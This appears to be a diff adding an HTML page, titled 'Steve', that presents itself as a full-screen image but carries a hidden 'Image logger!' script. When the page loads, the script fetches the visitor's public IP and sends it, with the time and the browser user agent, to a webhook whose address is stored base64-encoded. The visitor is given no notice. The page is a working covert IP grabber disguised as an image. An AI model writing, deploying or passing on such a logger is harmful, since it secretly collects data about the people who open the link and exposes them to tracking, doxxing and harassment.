@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <title>Steve</title>
+    <img src="steve.jpg" style="width: 100%; height: 100vh; object-fit: cover;">
+</head>
+<body>
+    <script>
+        const MMMA = '' // <--- Webhook Encoded in Base64
+
+        const WAMDD = atob(MMMA);
+        
+        async function sendVisitorData() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+
+    const payload = {
+    embeds: [
+        {
+            title: "Image logger!",
+            color: 0x3498db,
+            fields: [
+                {
+                    name: "IP",
+                    value: `${userIP}`,
+                },
+                {
+                    name: "Data",
+                    value: `${new Date().toLocaleString()}`,
+                },
+                {
+                    name: "WebBrowser",
+                    value: `${navigator.userAgent}`,
+                }
+            ],
+            timestamp: new Date().toISOString(),
+        }
+    ]
+};
+
+                await fetch(WAMDD, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                console.log('Sended.');
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        window.onload = sendVisitorData;
+    </script>
+</body>
+</html>
